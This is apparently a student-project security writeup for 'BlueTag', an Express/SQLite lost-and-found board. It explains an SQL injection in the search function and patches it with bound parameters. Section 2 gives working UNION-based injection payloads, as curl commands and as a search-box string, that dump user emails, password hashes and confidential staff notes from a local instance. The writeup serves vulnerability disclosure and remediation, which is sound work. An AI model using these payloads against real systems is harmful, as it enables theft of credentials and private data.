# BlueTag — Security Writeup

## 1. Architecture sketch

BlueTag is a small server-rendered Express app. There is no client-side framework; every
page is HTML rendered on the server with EJS, and all state lives in a single SQLite file.

```
Browser
  │  HTTP (form GET/POST, cookies)
  ▼
src/index.js ── Express app
  │   express-session (cookie: httpOnly, sameSite=lax)
  │   attachUser middleware  → res.locals.currentUser / flash
  │
  ├── src/routes/auth.js     /register /login /logout
  ├── src/routes/items.js    /  /items/new  /items  /items/:id  /items/:id/resolve  /me
  │
  ▼
src/db.js ── node:sqlite DatabaseSync  →  data/bluetag.db
  tables: users, items, intake_log   (seeded once on first boot by src/seed.js)
  │
  ▼
src/views/*.ejs → HTML back to the browser
```

**How a request becomes a row.** A signed-in user submits `POST /items`. The handler in
[items.js](src/routes/items.js) normalizes `kind`/`category` against allow-lists, validates
lengths, then runs a **parameterized** `INSERT ... VALUES (?, …)` bound to
`req.session.user.id` and the field values. `info.lastInsertRowid` gives the new id and the
user is redirected to `/items/:id`.

**Where authentication is enforced.** Sessions are cookie-based (express-session). On login,
[auth.js](src/routes/auth.js) looks the user up with a bound query and verifies the password
with `bcrypt.compareSync`; on success it stores a minimal `req.session.user`. Route
protection is the `requireAuth` middleware in [middleware/auth.js](src/middleware/auth.js),
applied to `/items/new`, `POST /items`, `POST /items/:id/resolve`, and `/me`. Ownership is a
second, separate check: `resolve` confirms `item.user_id === req.session.user.id` before
updating, and the UPDATE itself is scoped `WHERE id = ? AND user_id = ?`. The public board
(`/`) and item pages (`/items/:id`) are intentionally unauthenticated.

**How search, filters, and item pages load data.** `GET /` reads `q`, `category`, and `kind`
from the query string and calls `searchItems()`, which builds a `SELECT … FROM items JOIN
users` restricted to `status != 'removed'`, ordered newest-first, `LIMIT 50`. `GET /items/:id`
runs a single bound `SELECT` joining the poster's `display_name`/`email`. Every value shown
in a template uses EJS's escaping tag `<%= %>`, so rendered output is HTML-safe (no stored
XSS through titles/descriptions).

---

## 2. The defect — SQL injection in board search (CWE-89)

**Location:** `searchItems()` in [src/routes/items.js](src/routes/items.js).

The search built its WHERE clause by string-concatenating the raw query parameters directly
into SQL:

```js
if (q) {
  sql += ` AND items.title || ' ' || items.description || ' ' || items.location LIKE '%${q}%'`;
}
if (category && category !== "all") {
  sql += ` AND items.category = '${category}'`;
}
if (kind && kind !== "all") {
  sql += ` AND items.kind = '${kind}'`;
}
```

All three parameters (`q`, `category`, `kind`) are attacker-controlled and land inside single
quotes. Closing the quote and adding `UNION SELECT …` lets an attacker return **arbitrary
rows from any table** in the result set. The board is public, so **no login is required**, and
the injection is invisible in normal use.

The `searchItems` SELECT has **11 columns**, so a UNION payload supplies 11 values and maps the
stolen columns onto the ones the card template displays (title, description, location, owner).

### How to trigger

Against a running instance (default `http://localhost:3000`):

**A. Dump every user's confidential `staff_notes` (incl. the hidden Public Safety account that is _not_ in the README):**

```bash
curl -sG http://localhost:3000/ \
  --data-urlencode "q=zzz' UNION SELECT 999,0,'lost','other',email,staff_notes,password_hash,'','open',created_at,display_name FROM users WHERE staff_notes IS NOT NULL -- "
```

Returned on the board as a normal-looking "listing":

> **publicsafety@campus.edu** — Do not publish. High-value locker A-14 release code is
> BLUE-4419. After-hours drop is the west vestibule of Hullihen Hall.

**B. Dump every user's email + bcrypt password hash** (offline-crackable):

```bash
curl -sG http://localhost:3000/ \
  --data-urlencode "q=zzz' UNION SELECT 999,0,'lost','other',email,password_hash,'x','','open','',display_name FROM users -- "
```

**C. Same class of bug via the filter params** (proves it is not just `q`):

```bash
curl -sG "http://localhost:3000/" \
  --data-urlencode "category=other' UNION SELECT 999,0,'lost','other',email,staff_notes,'x','','open','',display_name FROM users WHERE staff_notes IS NOT NULL -- "
```

Or paste this straight into the search box in the browser:

```
zzz' UNION SELECT 999,0,'lost','other',email,staff_notes,password_hash,'','open',created_at,display_name FROM users WHERE staff_notes IS NOT NULL --
```

### Impact

- **Confidentiality breach:** any anonymous visitor can read the entire database — all user
  emails, all bcrypt password hashes (crackable offline), and the private `staff_notes`
  including the locker release code and after-hours drop location.
- Also enables full enumeration of `removed` items and the `intake_log`, and boolean/UNION
  probing of any other table. (Stacked `;`-queries do **not** run — `node:sqlite`'s `prepare`
  compiles one statement — so this is a read/exfiltration bug, not arbitrary write. UNION-based
  read is more than enough to leak everything.)

---

## 3. The patch

Bind every user value as a query parameter so it can never be parsed as SQL. Behavior is
otherwise identical (the `%…%` `LIKE` substring match is preserved).

```js
const params = [];

if (q) {
  sql += ` AND items.title || ' ' || items.description || ' ' || items.location LIKE ?`;
  params.push(`%${q}%`);
}
if (category && category !== "all") {
  sql += ` AND items.category = ?`;
  params.push(category);
}
if (kind && kind !== "all") {
  sql += ` AND items.kind = ?`;
  params.push(kind);
}

sql += " ORDER BY items.created_at DESC LIMIT 50";
return db.prepare(sql).all(...params);
```

This matches the parameterized style already used everywhere else in the codebase (auth,
inserts, item lookup) — the search function was the lone exception.

### Verification (after patch)

| Test | Before | After |
|---|---|---|
| `q=` UNION payload (A) | leaks staff_notes / hashes | **"Nothing matches that search"** (payload treated as literal text) |
| `category=` UNION payload (C) | leaks staff_notes | **"Nothing matches that search"** |
| `q=keys` | 1 result | 1 result (unchanged) |
| `category=electronics` | 2 results | 2 results (unchanged) |
| `kind=found` | 4 results | 4 results (unchanged) |
| `q=Hall` (substring match) | 3 results | 3 results (unchanged) |

The server log stays clean (no 500s) and the `/` route already wraps `searchItems` in a
try/catch that renders a friendly message, so malformed input degrades gracefully.

---

## 4. Other observations (not fixed here — noted for the report)

- **Plaintext secrets in `users.staff_notes`.** The locker code lives in the database as
  clear text and is joined into a public-facing query path. Even with the injection closed,
  secrets like this should not sit next to public data; move them out of the app's DB or at
  least out of any table reachable by public routes. Defense-in-depth: `searchItems` only
  needs `users.display_name`, so it never had a reason to make the rest of the row reachable.
- **`.edu` gate is weak.** Registration checks `email.endsWith(".edu")` with no format
  validation, so `x@anything.edu` (or a lookalike) registers. Fine for a class demo; tighten
  if this were real.
- **Default `SESSION_SECRET`.** `src/index.js` falls back to a hard-coded dev secret; set a
  strong `SESSION_SECRET` in `.env` before hosting so session cookies can't be forged.
- `npm audit` reports advisories in transitive deps; run `npm audit fix` before deploying.

---

## 5. Hosting note

The app binds `0.0.0.0:${PORT}` and ships a `Dockerfile` + `docker-compose.yml`
(`docker compose up --build`, port 3000, data in the `bluetag-data` volume). Deploy that image
to any VM/PaaS that can expose port 3000, set `SESSION_SECRET`, and submit the resulting URL.
